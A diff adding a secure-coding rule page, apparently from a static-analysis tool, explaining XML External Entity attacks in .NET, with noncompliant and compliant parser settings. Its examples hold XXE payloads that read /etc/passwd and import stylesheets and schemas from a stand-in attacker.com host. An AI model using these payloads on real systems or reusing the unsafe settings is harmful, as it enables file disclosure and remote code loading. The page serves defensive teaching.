@@ -1,0 +1,172 @@
+<p><a href="https://www.w3.org/TR/xml/">XML specification</a> allows the use of entities that can be <a
+href="https://www.w3.org/TR/xml/#sec-internal-ent">internal</a> or <a href="https://www.w3.org/TR/xml/#sec-external-ent">external</a> (file system /
+network access ...).</p>
+<p>Allowing access to external entities in XML parsing could lead to vulnerabilities like confidential file disclosures or <a
+href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRFs</a>:</p>
+<p>Example in XML document:</p>
+<pre>
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+  &lt;!DOCTYPE test [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+  ]&gt;
+&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.attacking.com/deleteall"&gt;
+  &lt;to&gt;&amp;xxe;&lt;/to&gt;
+  &lt;from&gt;Jani&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
+&lt;/note&gt;
+</pre>
+<p>Example in XSL document:</p>
+<pre>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY content SYSTEM "file:/etc/passwd"&gt;
+]&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:import href="http://www.attacker.com/evil.xsl"/&gt;
+  &lt;xsl:include href="http://www.attacker.com/evil.xsl"/&gt;
+ &lt;xsl:template match="/"&gt;
+  &amp;content;
+ &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</pre>
+<p>Example in XSD document:</p>
+<pre>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "" [
+   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+  ]&gt;
+&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"&gt;
+  &lt;xs:import namespace="test" schemaLocation="http://www.attacker.com/evil.xsd"/&gt;
+  &lt;xs:element name="note"&gt;
+    &lt;xs:complexType&gt;
+      &lt;xs:sequence&gt;
+        &lt;xs:element name="to" type="xs:string"/&gt;
+        &lt;xs:element name="from" type="xs:string"/&gt;
+        &lt;xs:element name="heading" type="xs:string"/&gt;
+        &lt;xs:element name="body" type="xs:string"/&gt;
+      &lt;/xs:sequence&gt;
+    &lt;/xs:complexType&gt;
+  &lt;/xs:element&gt;
+&lt;/xs:schema&gt;
+</pre>
+<p>It is recommended to disable access to external entities.</p>
+<h2>Noncompliant Code Examples</h2>
+<p>System.Xml.Linq.XDocument</p>
+<pre>
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Parse; // Unsafe: DTDs will be processed
+settings.XmlResolver = new XmlUrlResolver(); // Unsafe: XmlUrlResolver is used to resolve external XML resources such as entities, document type definitions (DTDs) or schemas.
+XmlReader reader = XmlReader.Create("xxe.xml", settings); // Noncompliant: parser created with unsafe configurations
+
+XDocument parser = XDocument.Load(reader);
+</pre>
+<p>System.Xml.XmlDictionaryReader</p>
+<pre>
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Parse;
+settings.XmlResolver = new XmlUrlResolver();
+
+XmlReader reader = XmlReader.Create("xxe.xml", settings);
+XmlDictionaryReader dict = XmlDictionaryReader.CreateDictionaryReader(reader);
+while (dict.Read()) // Noncompliant: XmlDictionaryReader is safe by default and becomes unsafe if used with an unsafe parser (here XmlReader)
+{ ... }
+</pre>
+<p>System.Xml.XmlDocument</p>
+<pre>
+// .NET Framework &lt; 4.5.2
+XmlDocument parser = new XmlDocument();
+parser.LoadXml("xxe.xml"); // Noncompliant: XmlDocument is not safe by default
+
+or
+
+// .NET Framework 4.5.2+
+XmlDocument parser = new XmlDocument();
+parser.XmlResolver = new XmlUrlResolver();
+parser.LoadXml("xxe.xml"); // Noncompliant: XmlDocument.XmlResolver configured with XmlUrlResolver that makes it unsafe
+</pre>
+<p>System.Xml.XmlReader</p>
+<pre>
+// .NET Framework 4.5.2+
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Parse;
+settings.XmlResolver = new XmlUrlResolver();
+XmlReader reader = XmlReader.Create("xxe.xml", settings);
+while (reader.Read()) // Noncompliant: XmlReader is safe by default and becomes unsafe if DtdProcessing = Parse and XmlResolver is not null
+{ ... }
+</pre>
+<p>System.Xml.XmlTextReader</p>
+<pre>
+// .NET Framework &lt; 4.5.2
+XmlTextReader reader = new XmlTextReader("xxe.xml");
+while (reader.Read()) // Noncompliant: XmlTextReady is not safe by default
+{ ... }
+
+or
+
+// .NET Framework 4.5.2+
+XmlTextReader reader = new XmlTextReader("xxe.xml");
+reader.XmlResolver = new XmlUrlResolver();
+while (reader.Read()) // Noncompliant: XmlTextRead.XmlResolver configured with XmlUrlResolver that makes it unsafe
+{ ... }
+</pre>
+<h2>Compliant Solution</h2>
+<p>System.Xml.Linq.XDocument</p>
+<pre>
+XDocument parser = XDocument.Load("xxe.xml"); // Compliant: XDocument is safe by default. DTD processing is turned off by default as described in https://github.com/dotnet/docs/blob/master/docs/csharp/programming-guide/concepts/linq/linq-to-xml-security.md
+</pre>
+<p>System.Xml.XmlDictionaryReader</p>
+<pre>
+XmlDictionaryReader reader = XmlDictionaryReader.CreateTextReader(Encoding.ASCII.GetBytes(xmlText), XmlDictionaryReaderQuotas.Max);
+while (reader.Read()) // Compliant: XmlReXmlDictionaryReaderader is safe by default
+{ ... }
+</pre>
+<p>System.Xml.XmlDocument</p>
+<pre>
+XmlDocument parser = new XmlDocument();
+parser.XmlResolver = null;
+parser.LoadXml("xxe.xml"); // Compliant: XmlResolver has been set to null
+
+or
+
+XmlDocument parser = new XmlDocument();
+parser.LoadXml("xxe.xml"); // Compliant: XmlDocument is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
+</pre>
+<p>System.Xml.XmlNodeReader</p>
+<pre>
+XmlDocument doc = new XmlDocument();
+doc.LoadXml("xxe.xml); // XmlDocument is safe by default in  .NET Framework 4.5.2+
+
+XmlNodeReader reader = new XmlNodeReader(doc);  // Compliant: XmlNodeReader is safe by default even if XmlDocument is not
+</pre>
+<p>System.Xml.XmlReader</p>
+<pre>
+XmlReader reader = XmlReader.Create("xxe.xml");
+while (reader.Read()) // Compliant: XmlReader is safe by default
+{ ... }
+</pre>
+<p>System.Xml.XmlTextReader</p>
+<pre>
+// .NET 4.5.2+
+XmlTextReader reader = new XmlTextReader("xxe.xml");
+while (reader.Read()) // Compliant: XmlTextReader is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
+{ ... }
+
+// .NET 4.0 to .NET 4.5.1
+XmlTextReader reader = new XmlTextReader("xxe.xml");
+reader.DtdProcessing = DtdProcessing.Prohibit; // Compliant: XmlTextReader is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
+
+// &lt; .NET 4.0
+XmlTextReader reader = new XmlTextReader(stream);
+reader.ProhibitDtd = true; // Compliant: default is false
+</pre>
+<h2>See</h2>
+<ul>
+  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities
+  (XXE) </li>
+  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#net">OWASP XXE Prevention Cheat
+  Sheet</a> </li>
+  <li> <a href="http://cwe.mitre.org/data/definitions/611.html">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li>
+  <li> <a href="http://cwe.mitre.org/data/definitions/827.html">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li>
+</ul>
+
